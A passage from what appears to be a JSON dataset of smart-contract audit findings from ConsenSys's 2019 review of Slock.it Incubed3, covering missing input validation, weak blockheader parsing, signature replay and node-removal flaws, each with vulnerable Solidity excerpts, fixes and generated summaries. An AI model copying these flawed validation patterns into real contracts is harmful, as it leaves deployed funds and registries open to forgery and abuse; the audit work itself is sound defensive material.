\\_signer,\n        string calldata \\_url,\n        uint64 \\_props,\n        uint64 \\_timeout,\n        uint64 \\_weight\n    )\n\n```\n* The method should actually only allow to change node properties when `owner==signer` otherwise `updateNode` is bypassing the strict requirements enforced with `registerNodeFor` where e.g. the `url` needs to be signed by the signer in order to register it.\n* The emitted event should always emit `node.signer` instead of `msg.signer` which can be wrong.\n* The method should emit its own distinct event `LogNodeUpdated` for audit purposes and to be able to distinguish new node registrations from node structure updates. This might also require software changes to client/node implementations to listen for node updates.",
      "summary": "\nThis bug report is about an issue found in the `NodeRegistryData.sol` contract, which is part of the in3-contracts repository. When the `owner` calls the `updateNode()` function, the `signer` of the new URL is replaced by `msg.sender` which in this case is the owner of the node. The method also emits a `LogNodeRegistered` event when the node structure is updated, however, the event will always emit `msg.sender` as the signer, even though that might not be true.\n\nThe recommendation is that the `updateNode()` function should get the signer as an input used to reference the node structure and this `signer` should be set for the `UrlInformation`. The method should only allow to change node properties when `owner==signer` and the emitted event should always emit `node.signer` instead of `msg.signer`. Additionally, the method should emit its own distinct event `LogNodeUpdated` for audit purposes and to be able to distinguish new node registrations from node structure updates. This might also require software changes to client/node implementations to listen for node updates.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13975",
      "title": "BlockhashRegistry - recreateBlockheaders succeeds and emits an event even though no blockheaders have been provided âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed the vulnerable scenarios by adding proper checks to:\n\n\n* Prevent passing empty `_blockheaders` in [8d2bfa40](https://git.slock.it/in3/in3-contracts/commit/8d2bfa40ac10dae9a1ae046ca1ed7d2fbf2e0425)\n* Prevent storing the same blockhash twice in [80bb6ecf](https://git.slock.it/in3/in3-contracts/commit/80bb6ecf19ec4cbc2de0367c4c5dc31661533689)\n\n\n\n\n#### Description\n\n\nThe method is used to re-create blockhashes from a list of rlp-encoded `_blockheaders`. However, the method never checks if `_blockheaders` actually contains items. The result is, that the method will unnecessarily store the same value that is already in the `blockhashMapping` at the same location and wrongly log `LogBlockhashAdded` even though nothing has been added nor changed.\n\n\n* 1. assume `_blockheaders` is empty and the registry already knows the blockhash of `_blockNumber`\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L61-L67**\n\n\n\n```\nfunction recreateBlockheaders(uint \\_blockNumber, bytes[] memory \\_blockheaders) public {\n\n    bytes32 currentBlockhash = blockhashMapping[\\_blockNumber];\n    require(currentBlockhash != 0x0, \"parentBlock is not available\");\n\n    bytes32 calculatedHash = reCalculateBlockheaders(\\_blockheaders, currentBlockhash);\n    require(calculatedHash != 0x0, \"invalid headers\");\n\n```\n* 2. An attempt is made to re-calculate the hash of an empty `_blockheaders` array (also passing the `currentBlockhash` from the registry)\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L66-L66**\n\n\n\n```\nbytes32 calculatedHash = reCalculateBlockheaders(\\_blockheaders, currentBlockhash);\n\n```\n* 3. The following loop in `reCalculateBlockheaders` is skipped and the `currentBlockhash` is returned.\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L134-L149**\n\n\n\n```\nfunction reCalculateBlockheaders(bytes[] memory \\_blockheaders, bytes32 \\_bHash) public pure returns (bytes32 bhash) {\n\n    bytes32 currentBlockhash = \\_bHash;\n    bytes32 calcParent = 0x0;\n    bytes32 calcBlockhash = 0x0;\n\n    /// save to use for up to 200 blocks, exponential increase of gas-usage afterwards\n    for (uint i = 0; i < \\_blockheaders.length; i++) {\n        (calcParent, calcBlockhash) = getParentAndBlockhash(\\_blockheaders[i]);\n        if (calcBlockhash != currentBlockhash) {\n            return 0x0;\n        }\n        currentBlockhash = calcParent;\n    }\n\n    return currentBlockhash;\n\n```\n* 4. The assertion does not fire, the `bnr` to store the `calculatedHash` is the same as the one initially provided to the method as an argument.. Nothing has changed but an event is emitted.\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L69-L74**\n\n\n\n```\n    /// we should never fail this assert, as this would mean that we were able to recreate a invalid blockchain\n    assert(\\_blockNumber > \\_blockheaders.length);\n    uint bnr = \\_blockNumber - \\_blockheaders.length;\n    blockhashMapping[bnr] = calculatedHash;\n    emit LogBlockhashAdded(bnr, calculatedHash);\n}\n\n```\n#### Recommendation\n\n\nThe method is crucial for the system to work correctly and must be tightly controlled by input validation. It should not be allowed to overwrite an existing value in the contract ([issue 6.29](#blockhashregistry---existing-blockhashes-can-be-overwritten)) or emit an event even though nothing has happened. Therefore validate that user provided input is within safe bounds. In this case, that at least one `_blockheader` has been provided. Validate that `_blockNumber` is less than `block.number` and do not expect that parts of the code will throw and safe the contract from exploitation.",
      "summary": "\nA bug was discovered in the BlockhashRegistry.sol contract, which allowed for vulnerable scenarios and potentially overwriting existing blockhashes. The method used to re-create blockhashes from a list of rlp-encoded _blockheaders was not properly checking if _blockheaders actually contained items. As a result, the method was unnecessarily storing the same value that was already in the blockhashMapping at the same location and wrongly logging LogBlockhashAdded even though nothing had been added nor changed.\n\nTo fix the issue, proper checks were added to prevent passing empty _blockheaders in [8d2bfa40](https://git.slock.it/in3/in3-contracts/commit/8d2bfa40ac10dae9a1ae046ca1ed7d2fbf2e0425) and to prevent storing the same blockhash twice in [80bb6ecf](https://git.slock.it/in3/in3-contracts/commit/80bb6ecf19ec4cbc2de0367c4c5dc31661533689).\n\nIt is recommended that user provided input is validated to be within safe bounds, such as at least one _blockheader being provided, and that _blockNumber is less than block.number. Additionally, the code should not expect parts of it to throw and safe the contract from exploitation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13974",
      "title": "BlockhashRegistry - recreateBlockheaders allows invalid parent hashes for intermediary blocks âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed by requiring valid parent hashes for blockheaders.\n\n\n#### Description\n\n\nIt is assumed that a blockhash of `0x00` is invalid, but the method accepts intermediary parent hashes extracted from blockheaders that are zero when establishing the trust chain.\n\n\n`recreateBlockheaders` relies on `reCalculateBlockheaders` to correctly establish a chain of trust from the provided list of `_blockheaders` to a valid blockhash stored in the contract. However, `reCalculateBlockheaders` fails to raise an exception in case `getParentAndBlockhash` returns a blockhash of `0x00`. Subsequently it will skip over invalid blockhashes and continue to establish the trust chain without raising an error.\n\n\nThis may allow an attacker with enough hashing power to store a blockheader hash that is actually invalid on the real chain but accepted within this smart contract. This may even only be done temporarily to overwrite an existing hash for a short period of time (see <https://github.com/ConsenSys/slockit-in3-audit-2019-09/issues/24)>.\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L141-L147**\n\n\n\n```\nfor (uint i = 0; i < \\_blockheaders.length; i++) {\n    (calcParent, calcBlockhash) = getParentAndBlockhash(\\_blockheaders[i]);\n    if (calcBlockhash != currentBlockhash) {\n        return 0x0;\n    }\n    currentBlockhash = calcParent;\n}\n\n```\n#### Recommendation\n\n\nStop processing the array of `_blockheaders` immediately if a blockheader is invalid.",
      "summary": "\nThis bug report concerns a vulnerability in the smart contract code of BlockhashRegistry.sol, which is part of the slockit-in3-audit-2019-09 project. The vulnerability is caused by a method called `reCalculateBlockheaders` which fails to raise an exception when `getParentAndBlockhash` returns a blockhash of `0x00`. This allows an attacker with enough hashing power to overwrite an existing hash for a short period of time.\n\nThe resolution was to fix the bug by requiring valid parent hashes for blockheaders. The recommendation was to stop processing the array of `_blockheaders` immediately if a blockheader is invalid.\n\nIn conclusion, this bug report highlighted a vulnerability in the BlockhashRegistry.sol code which was successfully resolved by requiring valid parent hashes for blockheaders. The recommendation was to stop processing the array of `_blockheaders` immediately if a blockheader is invalid.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13973",
      "title": "Registries - Incomplete input validation and inconsistent order of validations Â Pending",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis issue describes general inconsistencies of the smart contract code base. The inconsistencies have been addressed with multiple change-sets:\n\n\nIssues that have been addressed by the development team:\n\n\n* > \n> `BlockhashRegistry.reCalculateBlockheaders` - bhash can be zero; blockheaders can be empty\n> \n> \n> \n\n\nFixed in [8d2bfa40](https://git.slock.it/in3/in3-contracts/commit/8d2bfa40ac10dae9a1ae046ca1ed7d2fbf2e0425) by adding the missing checks.\n* > \n> `BlockhashRegistry.recreateBlockheaders` - blockheaders can be empty; Arguments should be validated before calculating values that depend on them.\n> \n> \n> \n\n\nFixed in [8d2bfa40](https://git.slock.it/in3/in3-contracts/commit/8d2bfa40ac10dae9a1ae046ca1ed7d2fbf2e0425) by adding the missing checks.\n* > \n> `NodeRegistry.removeNode` - should check `require(_nodeIndex < nodes.length)` first before any other action.\n> \n> \n> \n\n\nFixed in [47255587](https://git.slock.it/in3/in3-contracts/commit/47255587da43fb020b17e18addb3956a078bf45a) by adding the missing checks.\n* > \n> `NodeRegistry.registerNodeFor` - Signature version `v` should be checked to be either `27 || 28` before verifying it.\n> \n> \n> \n\n\nThe fix in [47255587](https://git.slock.it/in3/in3-contracts/commit/47255587da43fb020b17e18addb3956a078bf45a) introduced a serious [typo](https://git.slock.it/in3/in3-contracts/commit/47255587da43fb020b17e18addb3956a078bf45a#03139dd7c6f7b85cd811ab3d7833e748b25e2902_216_216) (`v != _v`) that has been fixed with [4a0377c5](https://git.slock.it/in3/in3-contracts/commit/4a0377c51bcc9e3cc46dcaba950de83e7b2dd7ce).\n* > \n> `NodeRegistry.revealConvict` - unchecked `signer`\n> \n> \n> \n\n\nAddressed with the comment that `signer gets checked by ecrecover` ([slock.it/issue/10](https://git.slock.it/in3/in3-contracts/issues/10)).\n* > \n> `NodeRegistry.revealConvict` - signer status can be checked earlier.\n> Addressed with the following comment ([slock.it/issue/10](https://git.slock.it/in3/in3-contracts/issues/10)):\n> \n> \n>\n\n\n\n> \n> Due to the seperation of the contracts we will now check check the signatures and whether the blockhash is right. Only after this steps we will call into the NodeRegistryData contracts, thus potentially saving gas\n> \n> \n> \n\n\n* > \n> `NodeRegistry.updateNode` - the check if the `newURL` is registered can be done earlier\n> \n> \n> \n\n\nFixed in [4786a966](https://git.slock.it/in3/in3-contracts/commit/4786a966fa5e0804ce299513feadb61a2ccebc69).\n* > \n> `BlockhashRegistry.getParentAndBlockhash`- blockheader structure can be random as long as parenthash can be extracted\n> \n> \n> \n\n\nThis issue has been reviewed as part of [issue 6.16](#blockhashregistry---structure-of-provided-blockheaders-should-be-validated) ([99f35fce](https://git.slock.it/in3/in3-contracts/commit/99f35fce25b247d33beeae4032b5be184584b3f4)).\n\n\nIssues that have **not been addressed** by the development team and still persist:\n\n\n* `BlockhashRegistry.searchForAvailableBlock` - `_startNumber + _numBlocks` can be > `block.number; _startNumber + _numBlocks` can overflow.\n\n\nThis issue has not been addressed.\n\n\nGeneral Notes:\n\n\n* Ideally commits directly reference issues that were raised during the audit. During the review of the mitigations provided with the change-sets for the listed issues we observed that change-sets contain changes that are not directly related to the issues. (e.g. [79e5a302](https://git.slock.it/in3/in3-contracts/commit/79e5a302399caf129a8ab76c1abb4f50ef8fbe0e))\n\n\n\n\n#### Description\n\n\nMethods and Functions usually live in one of two worlds:\n\n\n* public API - methods declared with visibility `public` or `external` exposed for interaction by other parties\n* internal API - methods declared with visibility `internal`, `private` that are not exposed for interaction by other parties\n\n\nWhile it is good practice to visually distinguish internal from public API by following commonly accepted naming convention e.g. by prefixing internal functions with an underscore (`_doSomething` vs. `doSomething`) or adding the keyword `unsafe` to unsafe functions that are not performing checks and may have a dramatic effect to the system (`_unsafePayout` vs. `RequestPayout`), it is important to properly verify that inputs to methods are within expected ranges for the implementation.\n\n\nInput validation checks should be explicit and well documented as part of the codeâ€™s documentation. This is to make sure that smart-contracts are robust against erroneous inputs and reduce the potential attack surface for exploitation.\n\n\nIt is good practice to verify the methods input as early as possible and only perform further actions if the validation succeeds. Methods can be split into an external or public API that performs initial checks and subsequently calls an internal method that performs the action.\n\n\nThe following lists some public API methods that are not properly checking the provided data:\n\n\n* `BlockhashRegistry.reCalculateBlockheaders` - bhash can be zero; blockheaders can be empty\n* `BlockhashRegistry.getParentAndBlockhash`- blockheader structure can be random as long as parenthash can be extracted\n* `BlockhashRegistry.recreateBlockheaders` - blockheaders can be empty; Arguments should be validated before calculating values that depend on them:\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L70-L70**\n\n\n\n```\nassert(\\_blockNumber > \\_blockheaders.length);\n\n```\n* `BlockhashRegistry.searchForAvailableBlock` - `_startNumber + _numBlocks` can be > `block.number; _startNumber + _numBlocks` can overflow.\n* `NodeRegistry.removeNode` - should check `require(_nodeIndex < nodes.length)` first before any other action.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L602-L609**\n\n\n\n```\nfunction removeNode(uint \\_nodeIndex) internal {\n    // trigger event\n    emit LogNodeRemoved(nodes[\\_nodeIndex].url, nodes[\\_nodeIndex].signer);\n    // deleting the old entry\n    delete urlIndex[keccak256(bytes(nodes[\\_nodeIndex].url))];\n    uint length = nodes.length;\n\n    assert(length > 0);\n\n```\n* `NodeRegistry.registerNodeFor` - Signature version `v` should be checked to be either `27 || 28` before verifying it.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L200-L212**\n\n\n\n```\nfunction registerNodeFor(\n    string calldata \\_url,\n    uint64 \\_props,\n    uint64 \\_timeout,\n    address \\_signer,\n    uint64 \\_weight,\n    uint8 \\_v,\n    bytes32 \\_r,\n    bytes32 \\_s\n)\n    external\n    payable\n{\n\n```\n* `NodeRegistry.revealConvict` - unchecked `signer`\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L321-L321**\n\n\n\n```\nSignerInformation storage si = signerIndex[\\_signer];\n\n```\n* `NodeRegistry.revealConvict` - signer status can be checked earlier.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L344-L344**\n\n\n\n```\nrequire(si.stage != Stages.Convicted, \"node already convicted\");\n\n```\n* `NodeRegistry.updateNode` - the check if the `newURL` is registered can be done earlier\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L444-L444**\n\n\n\n```\nrequire(!urlIndex[newURl].used, \"url is already in use\");\n\n```\n#### Recommendation\n\n\nUse [Checks-Effects-Interactions](https://solidity.readthedocs.io/en/develop/security-considerations.html?highlight=check%20effects#use-the-checks-effects-interactions-pattern) pattern for all functions.",
      "summary": "\nThis bug report describes general inconsistencies of the smart contract code base that were addressed with multiple change-sets. Issues that were addressed include `BlockhashRegistry.reCalculateBlockheaders`, `BlockhashRegistry.recreateBlockheaders`, `NodeRegistry.removeNode`, `NodeRegistry.registerNodeFor`, `NodeRegistry.revealConvict`, and `NodeRegistry.updateNode`. These issues were addressed by adding missing checks, fixing typos, and adding comments. The issue `BlockhashRegistry.searchForAvailableBlock` was not addressed by the development team and still persists.\n\nIt is good practice to verify methods input as early as possible and only perform further actions if the validation succeeds. This is to make sure that smart-contracts are robust against erroneous inputs and reduce the potential attack surface for exploitation. It is also important to properly verify that inputs to methods are within expected ranges for the implementation. Input validation checks should be explicit and well documented as part of the codeâ€™s documentation.\n\nThe recommendation for this bug report is to use the [Checks-Effects-Interactions](https://solidity.readthedocs.io/en/develop/security-considerations.html?highlight=check%20effects#use-the-checks-effects-interactions-pattern) pattern for all functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13972",
      "title": "BlockhashRegistry - Structure of provided blockheaders should be validated âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nMitigated by:\n\n\n* [99f35fce](https://git.slock.it/in3/in3-contracts/commit/99f35fce25b247d33beeae4032b5be184584b3f4) - validating the block number in the provided RLP encoded input data\n* [79e5a302](https://git.slock.it/in3/in3-contracts/commit/79e5a302399caf129a8ab76c1abb4f50ef8fbe0e) - fixes the potential out of bounds access for `parentHash` by requiring the the input to contain at least data up until including the `parentHash` in the user provided RLP blob. However, this check does not enforce that the minimum amount of data is available to extract the `blockNumber`\n\n\nAdditionally we would like to note the following:\n\n\n* While the code decodes the RLPLongList structure that contains the blockheader fields it does not decode the RLPLongString `parentHash` and just assumes one length-byte for it.\n* The length of the RLPLongString `parentHash` is never used but skipped instead.\n* The decoding is incomplete and fragile. The method does not attempt to decode other fields in the struct to verify that they are indeed valid RLP data. For the blockNumber extraction a fixed offset of `444` is assumed to access the `difficulty` RLP field (this might through as the minimum input length up to this field is not enforced). `difficulty` is then skipped and the `blockNumber` is accessed.\n* The minimum input data length enforced is shorter than a typical blockheader.\n* The code relies on implicit exceptions for out of bounds array access instead of verifying early on that enough input bytes are available to extract the required data.\n\n\nWe would also like to note that the commit referenced as mitigation does not appear to be based on the audit code.\n\n\n\n\n#### Description\n\n\n`getParentAndBlockhash` takes an rlp-encoded blockheader blob, extracts the parent parent hash and returns both the parent hash and the calculated blockhash of the provided data. The method is used to add blockhashes to the registry that are older than 256 blocks as they are not available to the evm directly. This is done by establishing a trust-chain from a blockhash that is already in the registry up to an older block\n\n\n1. The method assumes that valid rlp encoded data is provided but the structure is not verified (rlp decodes completely; block number is correct; timestamp is younger than prevs, â€¦), giving a wide range of freedom to an attacker with enough hashing power (or exploiting potential future issues with keccak) to forge blocks that would never be accepted by clients, but may be accepted by this smart contract. (threat: mining pool forging arbitrary non-conformant blocks to exploit the BlockhashRegistry)\n2. It is not checked that input was actually provided. However, accessing an array at an invalid index will raise an exception in the EVM. Providing a single byte > `0xf7` will yield a result and succeed even though it would have never been accepted by a real node.\n3. It is assumed that the first byte is the rlp encoded length byte and an offset into the provided `_blockheader` bytes-array is calculated. Memory is subsequently accessed via a low-level `mload` at this calculated offset. However, it is never validated that the offset actually lies within the provided range of bytes `_blockheader` leading to an out-of-bounds memory read access.\n4. The rlp encoded data is only partially decoded. For the first rlp list the number of length bytes is extracted. For the rlp encoded long string a length byte of 1 is assumed. The inline comment appears to be inaccurate or might be misleading.\n`// we also have to add \"2\" = 1 byte to it to skip the length-information`\n5. Invalid intermediary blocks (e.g. with parent hash `0x00`) will be accepted potentially allowing an attacker to optimize the effort needed to forge invalid blocks skipping to the desired blocknumber overwriting a certain blockhash (see [issue 6.18](#blockhashregistry---recreateblockheaders-allows-invalid-parent-hashes-for-intermediary-blocks))\n6. With one collisions (very unlikely) an attacker can add arbitrary or even random values to the BlockchainRegistry. The parent-hash of the starting blockheader cannot be verified by the contract (`[target_block_random]<--parent_hash--[rnd]<--parent_hash--[rnd]<--parent_hash--...<--parent_hash--[collision]<--parent_hash_collission--[anchor_block]`).\nWhile nodes can verify block structure and bail on invalid structure and check the first blocks hash and make sure the chain is in-tact the contract canâ€™t. Therefore one cannot assume the same trust in the blockchain registry when recreating blocks compared to running a full node.\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L98-L126**\n\n\n\n```\nfunction getParentAndBlockhash(bytes memory \\_blockheader) public pure returns (bytes32 parentHash, bytes32 bhash) {\n\n    /// we need the 1st byte of the blockheader to calculate the position of the parentHash\n    uint8 first = uint8(\\_blockheader[0]);\n\n    /// calculates the offset\n    /// by using the 1st byte (usually f9) and substracting f7 to get the start point of the parentHash information\n    /// we also have to add \"2\" = 1 byte to it to skip the length-information\n    require(first > 0xf7, \"invalid offset\");\n    uint8 offset = first - 0xf7 + 2;\n\n    /// we are using assembly because it's the most efficent way to access the parent blockhash within the rlp-encoded blockheader\n    // solium-disable-next-line security/no-inline-assembly\n    assembly { // solhint-disable-line no-inline-assembly\n        // mstore to get the memory pointer of the blockheader to 0x20\n        mstore(0x20, \\_blockheader)\n\n        // we load the pointer we just stored\n        // then we add 0x20 (32 bytes) to get to the start of the blockheader\n        // then we add the offset we calculated\n        // and load it to the parentHash variable\n        parentHash :=mload(\n            add(\n                add(\n                    mload(0x20), 0x20\n                ), offset)\n        )\n    }\n    bhash = keccak256(\\_blockheader);\n\n```\n#### Recommendation\n\n\n1. Validate that the provided data is within a sane range of bytes that is expected (min/max blockheader sizes).\n2. Validate that the provided data is actually an rlp encoded blockheader.\n3. Validate that the offset for the parent Hash is within the provided data.\n4. Validate that the parent Hash is non zero.\n5. Validate that blockhashes do not repeat.",
      "summary": "\nThis bug report is about a method called `getParentAndBlockhash` which takes an rlp-encoded blockheader blob, extracts the parent parent hash and returns both the parent hash and the calculated blockhash of the provided data. The method is used to add blockhashes to the registry that are older than 256 blocks as they are not available to the evm directly. The bug report found that the method assumes that valid rlp encoded data is provided but the structure is not verified, giving a wide range of freedom to an attacker with enough hashing power to forge blocks that would never be accepted by clients, but may be accepted by this smart contract. \n\nThe bug report also found that it is not checked that input was actually provided, and while the code decodes the RLPLongList structure that contains the blockheader fields it does not decode the RLPLongString `parentHash` and just assumes one length-byte for it. Additionally, the decoding is incomplete and fragile, as the method does not attempt to decode other fields in the struct to verify that they are indeed valid RLP data and the code relies on implicit exceptions for out of bounds array access instead of verifying early on that enough input bytes are available to extract the required data.\n\nThe bug report also found that invalid intermediary blocks (e.g. with parent hash `0x00`) will be accepted potentially allowing an attacker to optimize the effort needed to forge invalid blocks skipping to the desired blocknumber overwriting a certain blockhash. Finally, the bug report found that with one collisions (very unlikely) an attacker can add arbitrary or even random values to the BlockchainRegistry.\n\nThe bug report recommended that the method should validate that the provided data is within a sane range of bytes that is expected (min/max blockheader sizes), validate that the provided data is actually an rlp encoded blockheader, validate that the offset for the parent Hash is within the provided data, validate that the parent Hash is non zero, and validate that blockhashes do not repeat.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13971",
      "title": "NodeRegistry.registerNodeFor() no replay protection and expiration Â Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis issue was addressed with the following statement:\n\n\n\n> \n> In our understanding of the relationship between node-owner and signer the owner both are controlled by the very same entity, thus the owner should always know the privateKey of the signer. With this in mind a replay-protection would be useless, as the owner could always sign the necessary message.\n> The reason why we separated the signer from the owner was to enable the possibility of owning an in3-node as with a multisig-account, as due to the nature of the exposal of the signer-key the possibility of it being leaked somehow is given (e.g. someone â€œhacksâ€ the server), making the signer-key more unsecure.\n> In addition, even though itâ€™s possible to replay the register as an owner it would unfeasable, as the owner would have to pay for the deposit anyway thus rendering the attack useless as there would be no benefit for an owner to do it.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nAn owner can register a node with the signer not being the owner by calling `registerNodeFor`. The owner submits a message signed for the owner including the properties of the node including the url.\n\n\n* The signed data does not include the `registryID` nor the `NodeRegistry`â€™s address and can therefore be used by the owner to submit the same node to multiple registries or chains without the signers consent.\n* The signed data does not expire and can be re-used by the owner indefinitely to submit the same node again to future contracts or the same contract after the node has been removed.\n* Arguments are not validated in the external function (also see [issue 6.17](#registries---incomplete-input-validation-and-inconsistent-order-of-validations))\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L215-L223**\n\n\n\n```\nbytes32 tempHash = keccak256(\n    abi.encodePacked(\n        \\_url,\n        \\_props,\n        \\_timeout,\n        \\_weight,\n        msg.sender\n    )\n);\n\n```\n#### Recommendation\n\n\nInclude `registryID` and an expiration timestamp that is checked in the contract with the signed data. Validate function arguments.",
      "summary": "\nThis bug report is about an issue related to node-owner and signer. The owner can register a node with the signer not being the owner by calling `registerNodeFor`. The owner submits a message signed for the owner including the properties of the node including the url. This signed data does not include the `registryID` nor the `NodeRegistry`â€™s address and can therefore be used by the owner to submit the same node to multiple registries or chains without the signer's consent. The signed data does not expire and can be re-used by the owner indefinitely to submit the same node again to future contracts or the same contract after the node has been removed. Furthermore, arguments are not validated in the external function.\n\nTo address this issue, the statement suggests that the owner should always know the privateKey of the signer, and that a replay-protection would be useless because the owner could always sign the necessary message. It also suggests that the reason for separating the signer from the owner was to enable the possibility of owning an in3-node as with a multisig-account, as due to the nature of the exposal of the signer-key the possibility of it being leaked somehow is given.\n\nThe recommendation is to include `registryID` and an expiration timestamp that is checked in the contract with the signed data, as well as to validate function arguments.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13970",
      "title": "Impossible to remove malicious nodes after the initial period âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis issue has been addressed with a large [change-set](https://git.slock.it/in3/in3-contracts/merge_requests/6) that splits the NodeRegistry into two contracts, which results in a code flow that mitigates this issue by making the logic contract upgradable (after 47 days of notice).\nThe resolution adds more complexity to the system, and this complexity is not covered by the original audit. Splitting up the contracts has the side-effect of events being emitted by two different contracts, requiring nodes to subscribe to both contracts' events.\n\n\nThe need for removing malicious nodes from the registry, arises from the design decision to allow anyone to register any URL. These URLs might not actually belong to the registrar of the URL and might not be IN3 nodes. This is partially mitigated by a centralization feature introduced in the mitigation phase that implements whitelist functionality for adding nodes.\n\n\nWe generally advocate against adding complexity, centralization and upgrading mechanisms that can allow one party to misuse functionalities of the contract system for their benefit (e.g. `adminSetNodeDeposit` is only used to reset the deposit but allows the Logic contract to set any deposit; the logic contract is set by the owner and there is a 47 day timelock).\n\n\nWe believe the solution to this issue, should have not been this complex. The trust model of the system is changed with this solution, now the logic contract can allow the admin a wide range of control over the system state and data.\n\n\nThe following statement has been provided with the change-set:\n\n\n\n> \n> During the 1st year, we will keep the current mechanic even though itâ€™s a centralized approach.\n> However, we changed the structure of the smart contracts and separated the NodeRegistry into two different smart contracts: NodeRegistryLogic and NodeRegistryData. After a successful deployment only the NodeRegistryLogic-contract is able to write data into the NodeRegistryData-contract.\n> This way, we can keep the stored data (e.g. the nodeList) in the NodeRegistryData-contract while changing the way the data gets added/updated/removed is handled in the NodeRegistryLogic-contract.\n> We also provided a function to update the NodeRegistryLogic-contract, so that we are able to change to a better solution for removing nodes in an updated contract.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe system has centralized power structure for the first year after deployment. An `unregisterKey` (creator of the contract) is allowed to remove Nodes that are in state `Stages.Active` from the registry, only in 1st year.\n\n\nHowever, there is no possibility to remove malicious nodes from the registry after that.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L249-L264**\n\n\n\n```\n/// @dev only callable in the 1st year after deployment\nfunction removeNodeFromRegistry(address \\_signer)\n    external\n    onlyActiveState(\\_signer)\n{\n\n    // solium-disable-next-line security/no-block-members\n    require(block.timestamp < (blockTimeStampDeployment + YEAR\\_DEFINITION), \"only in 1st year\");// solhint-disable-line not-rely-on-time\n    require(msg.sender == unregisterKey, \"only unregisterKey is allowed to remove nodes\");\n\n    SignerInformation storage si = signerIndex[\\_signer];\n    In3Node memory n = nodes[si.index];\n\n    unregisterNodeInternal(si, n);\n\n}\n\n```\n#### Recommendation\n\n\nProvide a solution for the network to remove fraudulent node entries. This could be done by voting mechanism (with staking, etc).",
      "summary": "\nThis bug report is about the lack of a mechanism in the NodeRegistry contract to remove malicious nodes from the registry after the first year of deployment. The contract currently only allows the `unregisterKey` (creator of the contract) to remove nodes that are in state `Stages.Active` in the first year. After that, there is no way to remove malicious nodes from the registry.\n\nA change-set was implemented to address the issue, which split the NodeRegistry into two contracts and made the logic contract upgradable after 47 days of notice. This solution adds more complexity to the system, and this complexity is not covered by the original audit. It also introduces a centralization feature that implements whitelist functionality for adding nodes.\n\nThe recommendation is to provide a solution for the network to remove fraudulent node entries. This could be done by voting mechanism (with staking, etc). This would allow the system to remain trustless and prevent any misuse of the contract system by one party to their benefit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13969",
      "title": "in3-server - handleRecreation tries to recreate blockchain if no block is available to recreate it from âœ“Â Fixed",
      "impact": "MEDIUM",
